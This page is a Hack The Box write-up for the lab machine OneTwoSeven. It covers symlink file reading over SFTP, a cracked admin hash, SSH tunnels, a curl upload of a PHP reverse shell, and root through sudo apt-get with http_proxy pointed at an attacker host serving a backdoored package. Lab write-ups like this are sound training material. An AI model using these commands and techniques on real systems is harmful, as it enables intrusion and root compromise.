<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="
  



  External Recon
  #

I started with my usual &ldquo;nmap&rdquo; scan:
$ nmap -sC -sV -oN initial 10.10.10.133

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10&#43;deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
After this scan I &ldquo;triple-tap&rdquo; my target with a &ldquo;script-&rdquo; and a &ldquo;all-ports-scan&rdquo;.
While the script-scan gave me no obvious further information to work with, the all-ports
scan gave me another &ldquo;port 60080 to work with.">
<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://www.tagnull.de/docs/HTB-Writeups/onetwoseven/">
  <meta property="og:site_name" content="www.tagnull.de">
  <meta property="og:title" content="OneTwoSeven">
  <meta property="og:description" content="External Recon # I started with my usual “nmap” scan:
$ nmap -sC -sV -oN initial 10.10.10.133 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u6 (protocol 2.0) 80/tcp open http Apache httpd 2.4.25 ((Debian)) After this scan I “triple-tap” my target with a “script-” and a “all-ports-scan”. While the script-scan gave me no obvious further information to work with, the all-ports scan gave me another “port 60080 to work with.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="docs">
    <meta property="article:published_time" content="2019-08-31T00:00:00+00:00">
    <meta property="article:modified_time" content="2019-08-31T00:00:00+00:00">
<title>OneTwoSeven | www.tagnull.de</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/logo.png" >
<link rel="canonical" href="https://www.tagnull.de/docs/HTB-Writeups/onetwoseven/">
<link rel="stylesheet" href="/book.min.aaab74181c6b1b4045b90f1cce4aaa1631e06c4b04ec2890a00c5723953b070a.css" integrity="sha256-qqt0GBxrG0BFuQ8czkqqFjHgbEsE7CiQoAxXI5U7Bwo=" crossorigin="anonymous">
  <script defer src="/fuse.min.js"></script>
  <script defer src="/en.search.min.de63d6cb0fd505a2752edf6e8b63e1a6d802508ebe3d50e761fb3984b8673f5b.js" integrity="sha256-3mPWyw/VBaJ1Lt9ui2PhptgCUI6&#43;PVDnYfs5hLhnP1s=" crossorigin="anonymous"></script>
<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>www.tagnull.de</span>
  </a>
</h2>


<div class="book-search hidden">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>
<script>document.querySelector(".book-search").classList.remove("hidden")</script>












  



  
  <ul>
    
      
        <li class="book-section-flat" >
          
  
  

  
    <input type="checkbox" id="section-68dfdd1925e75eeba80f6314fba9409f" class="toggle" checked />
    <label for="section-68dfdd1925e75eeba80f6314fba9409f" class="flex justify-between">
      <a role="button" class="">HTB Writeups</a>
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/bountyhunter/" class="">BountyHunter</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/cap/" class="">Cap</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/the-notebook/" class="">The Notebook</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/traceback/" class="">Traceback</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/safe/" class="">Safe</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/fortune/" class="">Fortune</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/onetwoseven/" class="active">OneTwoSeven</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/querier/" class="">Querier</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/irked/" class="">Irked</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/stratosphere/" class="">Stratosphere</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/access/" class="">Access</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/ypuffy/" class="">Ypuffy</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/secnotes/" class="">SecNotes</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <input type="checkbox" id="section-a371b3bebcf42b304463ef71f0bf4c99" class="toggle"  />
    <label for="section-a371b3bebcf42b304463ef71f0bf4c99" class="flex justify-between">
      <a role="button" class="">Exploit Development</a>
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/Exploit-Development/stack-overflow/" class="">Stack Overflow</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/Exploit-Development/ret2plt/" class="">ret2plt</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <input type="checkbox" id="section-e0a66dbcb0778aef460847a6ca8d2295" class="toggle"  />
    <label for="section-e0a66dbcb0778aef460847a6ca8d2295" class="flex justify-between">
      <a role="button" class="">Blog</a>
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/Blog/oscp-review/" class="">OSCP Review</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/Blog/gettinghashes/" class="">NTLM Hashes via GPO redirect</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>















</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>OneTwoSeven</strong>

  <label for="toc-control">
    
  </label>
</div>


  
 
      </header>

      
      
  <article class="markdown book-article"><p align="center">
  <img src="onetwoseven-banner.png" />
</p>
<hr>
<h1 id="external-recon">
  External Recon
  <a class="anchor" href="#external-recon">#</a>
</h1>
<p>I started with my usual &ldquo;nmap&rdquo; scan:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nmap -sC -sV -oN initial 10.10.10.133
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.25 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span></span></span></code></pre></div>
<p>After this scan I &ldquo;triple-tap&rdquo; my target with a &ldquo;script-&rdquo; and a &ldquo;all-ports-scan&rdquo;.
While the script-scan gave me no obvious further information to work with, the all-ports
scan gave me another &ldquo;port 60080 to work with.</p>
<p>A quick scan told me it&rsquo;s an unknown service and filtered.</p>
<pre tabindex="0"><code>PORT      STATE    SERVICE VERSION
60080/tcp filtered unknown
</code></pre><h1 id="explore">
  Explore
  <a class="anchor" href="#explore">#</a>
</h1>
<p>Since we just have one really interesting port to play with, I focused on it.
Opening &ldquo;port 80&rdquo; in my browser showed a website advertising their &ldquo;secure&rdquo; &ldquo;SFTP&rdquo; Service.</p>
<p>
  <img src="onetwoseven-securesftp.png" alt="sftp_website" /></p>
<p>First thing that stands out is the &ldquo;admin&rdquo; option in the menu.
But it&rsquo;s disabled and not clickable.</p>
<p>
  <img src="onetwoseven-menu.png" alt="website_menu" /></p>
<p>A quick look into the source-code of the site reveals a comment for that &ldquo;admin&rdquo; option.</p>
<p>
  <img src="onetwoseven-admin-source.png" alt="website_source" /></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!-- Only enable link if access from trusted networks admin/20190212 --&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!-- Added localhost admin/20190214 --&gt;</span>
</span></span><span style="display:flex;"><span>		  &lt;<span style="color:#f92672">li</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-item&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;adminlink&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-link disabled&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://onetwoseven.htb:60080/&#34;</span>&gt;Admin&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">li</span>&gt;</span></span></code></pre></div>
<p>This tells us something about that obscure port we found ealier. We can&rsquo;t access the admin link from the &ldquo;WAN&rdquo;.
But we&rsquo;ve got a &ldquo;DNS-Name&rdquo; we can put into our hosts-file. From now on we access the website only by it&rsquo;s &ldquo;DNS-Name&rdquo;.</p>
<p>Let&rsquo;s move on for now:</p>
<p>The &ldquo;Statistics&rdquo; option showed nothing that peeked my interest.
So I moved on to check the &ldquo;SignUp&rdquo; button.</p>
<p>
  <img src="onetwoseven-signup.png" alt="website_signup" /></p>
<p>We jump to a &ldquo;singup.php&rdquo; site and get some login-credentials.
Followed by some instructions how to use them.</p>
<p>
  <img src="onetwoseven-express-checkout.png" alt="website_express_checkout" /></p>
<p>Apperently I can upload files to: &ldquo;sftp://onetwoseven.htb&rdquo; and view them here: &ldquo;
  <a href="http://www.onetwoseven.htb/~ots-iM2I4N2Q%22">http://www.onetwoseven.htb/~ots-iM2I4N2Q"</a>.
After login I found this setup:</p>
<p>
  <img src="onetwoseven-sftp-cli.png" alt="sftp-cli" /></p>
<p>Let&rsquo;s put some content on it, shall we?</p>
<p>
  <img src="onetwoseven-put-php.png" alt="sftp-put-php" /></p>
<p>As you can see, I tried uploading a &ldquo;php-info.php&rdquo; script into the root-directory but are not allowed to.
After switching to the subdirectory the upload was successful.
Can we get code-execution?</p>
<p>
  <img src="onetwoseven-forbidden.png" alt="sftp-php-forbidden" /></p>
<p>Bummer. ;)
Let&rsquo;s try something else:</p>
<p>
  <img src="onetwoseven-index.png" alt="sftp-index" /></p>
<p>Ok. We are just not allowed to use php on the server. What now?
I tried a couple of things at this point, like:</p>
<ul>
<li>Directory-Traversals</li>
<li>Different types of executables like &ldquo;asp&rdquo; or &ldquo;aspx&rdquo;. (I test such things even when it&rsquo;s a Linux server. You never know. ;)</li>
</ul>
<p>And of cause: &ldquo;Symlinks&rdquo;</p>
<p>
  <img src="onetwoseven-etcpasswd.png" alt="symlink-passwd1" /></p>
<p>
  <img src="onetwoseven-passwd2.png" alt="symlink-passwd2" /></p>
<p>Bingo! We can read local files. We just have two entries. One is us. And one is well - someone else.
Let&rsquo;s ignore (but keep in mind) that the other user has a &ldquo;127.0.0.1&rdquo; in his entry.</p>
<p>But what-else can we read? Maybe folders?</p>
<p>
  <img src="onetwoseven-root.png" alt="symlink-root1" /></p>
<p>
  <img src="onetwoseven-root2.png" alt="symlink-root2" /></p>
<p>Hell yeah! (Don&rsquo;t be mistaken here. This looks straight forward now. But it took me quite some time to figure that out.)
I systematically went through all folders manually to check it&rsquo;s contents. Most folder weren&rsquo;t accessible to me though.</p>
<p>However one file was indeed the next step forward. The &ldquo;login.php.swp&rdquo; file.</p>
<p>
  <img src="onetwoseven-swp.png" alt="symlink-root2" /></p>
<p>The file looked like some sort of temporary file. And wasn&rsquo;t readable by a normal text-editor. So I ran <code>strings</code> against it to get
as much stuff out of there as possible. Which actually was quite successful if you ask me. ;)</p>
<p>
  <img src="onetwoseven-loginswp-hash.png" alt="login-hash" /></p>
<p>With a hash found, I went to an <a href="https://crackstation.net/" target="_blank">online-hashcrack-website</a> to see if it&rsquo;s a known hash.</p>
<p>
  <img src="onetwoseven-crackstation.png" alt="crackstation-hash" /></p>
<p>Sure enough we get a username &ldquo;ots-admin&rdquo; and password <code>Homesweethome1</code>. But for what service?
I tried to login to &ldquo;SFTP&rdquo; but get a &ldquo;permission denied&rdquo;.</p>
<p>Remember that &ldquo;admin&rdquo; option? It&rsquo;s time check it &hellip;.. somehow.</p>
<h1 id="weaponize">
  Weaponize
  <a class="anchor" href="#weaponize">#</a>
</h1>
<p>Let&rsquo;s recap what we know and have.</p>
<ul>
<li>&ldquo;admin panel&rdquo; accessible from &ldquo;localhost&rdquo;</li>
<li>&ldquo;admin credentials&rdquo; to probably that &ldquo;admin panel&rdquo;</li>
<li>&ldquo;SFTP&rdquo; access with normal user</li>
<li><code>/etc/passwd</code> (<em>wink wink</em>)</li>
</ul>
<p>But how can we trick the server thinking we are &ldquo;localhost&rdquo;?
Let&rsquo;s BECOME &ldquo;localhost&rdquo; by using our access to build a &ldquo;ssh-tunnel&rdquo;.</p>
<p><code>ssh -N -L 80:127.0.0.1:80 ots-iM2I4N2Q@10.10.10.133</code></p>
<p>and then accessing the Website again via &ldquo;127.0.0.1&rdquo;.</p>
<p>
  <img src="onetwoseven-tunnel1.png" alt="tunnel-1" /></p>
<p>As you see we can now can access the &ldquo;admin panel&rdquo;.
But before doing that - Do you remember that user with &ldquo;127.0.0.1&rdquo; in his entry?
We are now &ldquo;127.0.0.1&rdquo;. Think a second what this implies. :)</p>
<p>Ok. Got it? No?
No worries - it took me a while to get that part myself. We have access to his &ldquo;SFTP&rdquo;
account now. How?</p>
<p>Well - take a look at the &ldquo;SignUp&rdquo; Page.</p>
<p>
  <img src="onetwoseven-userpasswd.png" alt="user-passwd" /></p>
<p>We come from &ldquo;127.0.0.1&rdquo; therefore the application thinks we are him and presents us the password.
But before we can use the credentials we need to make sure we are comming from &ldquo;127.0.0.1&rdquo; for the &ldquo;SFTP&rdquo;
service aswell. Our present tunnel is just for &ldquo;port 80&rdquo; not &ldquo;port 22&rdquo;.</p>
<p><code>ssh -N -L 22:127.0.0.1:22 ots-iM2I4N2Q@10.10.10.133</code></p>
<p>
  <img src="onetwoseven-usertxt.png" alt="user-txt" /></p>
<p>Oh - there&rsquo;s the <code>user.txt</code>. That was unexpected right? We can now focus to get access to that box.
Although the &ldquo;admin-panel&rdquo; link is now clickable - we can&rsquo;t access the site right away because it&rsquo;s listening on &ldquo;port 60080&rdquo;.
Yep - you guest it. Another &ldquo;tunnel&rdquo; is needed.</p>
<p><code>ssh -N -L 60080:127.0.0.1:60080 ots-iM2I4N2Q@10.10.10.133</code></p>
<p>
  <img src="onetwoseven-adminlogin.png" alt="admin-login" /></p>
<p>
  <img src="onetwoseven-otsadmin-system.png" alt="admin-system" /></p>
<p>I used the credentials we cracked earlier.
But as you can see - there&rsquo;s a disabled upload button again. We can just enable it in the sourcecode.</p>
<p>
  <img src="onetwoseven-enablebutton.png" alt="burp-enablebutton" /></p>
<p>But because we might want to upload something over and over again - it would be a time saver to do it with &ldquo;curl&rdquo;.</p>
<h1 id="exploit">
  Exploit
  <a class="anchor" href="#exploit">#</a>
</h1>
<p>In order to build my &ldquo;curl&rdquo; query I started &ldquo;Burp&rdquo; to see how the request would look like and what &ldquo;cookie&rdquo; value I need to send over.</p>
<p>
  <img src="onetwoseven-burp-request.png" alt="burp-request" /></p>
<p>An alternative and simpler way is to use the &ldquo;developer-tools&rdquo; of your browser to get the cookie.</p>
<p>
  <img src="onetwoseven-alternate-sessionid.png" alt="ff-sessionid" /></p>
<p>After some trial and error I came up with the following command:</p>
<pre tabindex="0"><code>curl -H &#39;Cookie: PHPSESSID=immqdajjjet662lm9qctfrt7h3&#39; -H &#39;Host: onetwoseven.htb&#39; --form &#39;addon=@/root/HTB/Boxes/OneTwoSeven/ots-shell.php&#39; &#39;http://127.0.0.1:60080/addon-download.php?addon=/addon-upload.php&#39; -vvv
</code></pre><p><a href="https://davidwalsh.name/curl-post-file" target="_blank">This article</a> was very helpful if you want to learn more.</p>
<p>After uploading a simple &ldquo;php-reverse-shell&rdquo;, we can open a &ldquo;ncat&rdquo; session and launch our &ldquo;reverse-shell&rdquo; and doing our cli-magic after receiving it.</p>
<p>
  <img src="onetwoseven-revshellmagic.png" alt="shell-magic" /></p>
<p>
  <img src="onetwoseven-wearein.png" alt="trinity-wearein" /></p>
<h1 id="privilege-escalation">
  Privilege Escalation
  <a class="anchor" href="#privilege-escalation">#</a>
</h1>
<p>This write-up is already getting very long. So I come right to the meat of the &ldquo;PrivEsc&rdquo;.
When doing proper post-exploitation-recon, one command should not be missed: <code>sudo -l</code>.</p>
<p>Also this time it reveals what our target is.</p>
<p>
  <img src="onetwoseven-sudol.png" alt="sudol" /></p>
<pre tabindex="0"><code>env_reset, env_keep+=&#34;ftp_proxy http_proxy https_proxy no_proxy&#34;,mail_badpass,

User www-admin-data may run the following commands on onetwoseven:
(ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
</code></pre><p>Our user (&ldquo;www-data&rdquo;) is allowed to update the system and he has also the right to set the <code>http_proxy</code> environment-variable.</p>
<p>How does a upgrade look like right now?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt-get update
</span></span><span style="display:flex;"><span>Err:1 http://packages.onetwoseven.htb/devuan ascii InRelease
</span></span><span style="display:flex;"><span>  Temporary failure resolving <span style="color:#e6db74">&#39;packages.onetwoseven.htb&#39;</span> &lt;------
</span></span><span style="display:flex;"><span>Err:2 http://de.deb.devuan.org/merged ascii InRelease
</span></span><span style="display:flex;"><span>  Temporary failure resolving <span style="color:#e6db74">&#39;de.deb.devuan.org&#39;</span>
</span></span><span style="display:flex;"><span>Err:3 http://de.deb.devuan.org/merged ascii-security InRelease
</span></span><span style="display:flex;"><span>  Temporary failure resolving <span style="color:#e6db74">&#39;de.deb.devuan.org&#39;</span>
</span></span><span style="display:flex;"><span>Err:4 http://de.deb.devuan.org/merged ascii-updates InRelease
</span></span><span style="display:flex;"><span>  Temporary failure resolving <span style="color:#e6db74">&#39;de.deb.devuan.org&#39;</span>
</span></span><span style="display:flex;"><span>Reading package lists...</span></span></code></pre></div>
<p>This is the last missing bit. Because &ldquo;APT&rdquo; tries to resolve &ldquo;packages.onetwoseven.htb&rdquo; we can high-jack that request.
Which in turn means, we can install a malicious package as root.  I&rsquo;ll put a couple of links at the end for further reference on this topic.</p>
<p>The steps and network setup are roughly these:</p>
<pre tabindex="0"><code>1. Backdoor APT-Package
2. Set http_proxy to attacker-proxy
3. Redirect traffic from attacker-proxy to attack-webserver
4. Rebuild APT-Repository
5. Open a Reverse-Shell listener
6. Start upgrade
7. root!

&lt;Victim&gt; ---- [http_proxy=attacker:4444] ---- &lt;4444:attacker:5555&gt; ---- &lt;5555:attacker-webserver&gt; ---- [APT-Repository]
</code></pre><p>As you can see from the next screenshots I backdoored &ldquo;nano&rdquo;. Just download &ldquo;nano&rdquo; from the repository and run:</p>
<p><code>dpkg-deb -R nano.deb nano_output</code></p>
<p>Then add a post-install script and repack everything and build a repository.</p>
<p>
  <img src="onetwoseven-postinst.png" alt="postinst" /></p>
<p>
  <img src="onetwoseven-revshell-bd.png" alt="backdoor" /></p>
<p>This is how my folders were setup:</p>
<p>
  <img src="onetwoseven-apt.png" alt="apt-repo-tree" /></p>
<p>Yes, I did that manually. Which was painful, but worked. I later learned about <code>reprepo</code> from <a href="https://vulndev.io/2019/05/htb_onetwoseven.html" target="_blank">xct&rsquo;s WriteUp</a>.
A very simple tool for such things. In fact, I used this for this Write-up too.
First because I want to try it myself. Second because my VPN-IP changed, so my &ldquo;backdoored nano package&rdquo; wasn&rsquo;t working anymore.
I couldn&rsquo;t be bothered to go through the process of getting the signatures and hashes right again. It obviously has NOTHING to do with crappy note-taking for this part&hellip;..</p>
<p>If you would like to roll your own repo for this, you could watch ippsec&rsquo;s video.</p>
<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/EXuEDHFjS9E?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
    </div>

<p>Let&rsquo;s setup &ldquo;Burp&rdquo; and &ldquo;http_proxy&rdquo;:</p>
<p>
  <img src="onetwoseven-burp-setup.png" alt="burp-setup" /></p>
<p><code>export http_proxy='http://10.10.14.32:4444'</code></p>
<p>Make sure &ldquo;Intercept&rdquo; is off.</p>
<h1 id="root-flag">
  Root Flag
  <a class="anchor" href="#root-flag">#</a>
</h1>
<p>After running an <code>update</code> we see hits on our webserver. And after an <code>upgrade</code> we can install our backdoored
&ldquo;nano&rdquo; and get a &ldquo;root-shell&rdquo;.</p>
<p>
  <img src="onetwoseven-aptupdate.png" alt="apt-update" /></p>
<p>
  <img src="onetwoseven-rooted.png" alt="root-shell" /></p>
<p>One of my favorite boxes so far! :)
See you next time.</p>
<p>Additional Ressoures:</p>
<ul>
<li><a href="https://versprite.com/blog/apt-mitm-package-injection/" target="_blank">APT-Mitm-Package-Injection</a></li>
<li><a href="https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/" target="_blank">APT-PrivEsc</a></li>
<li><a href="http://wiki.blue-panel.com/index.php/Create_Signed_APT_repository" target="_blank">Create-Signed-APT-Repo</a></li>
</ul>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">





</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
  </main>

  
</body>
</html>












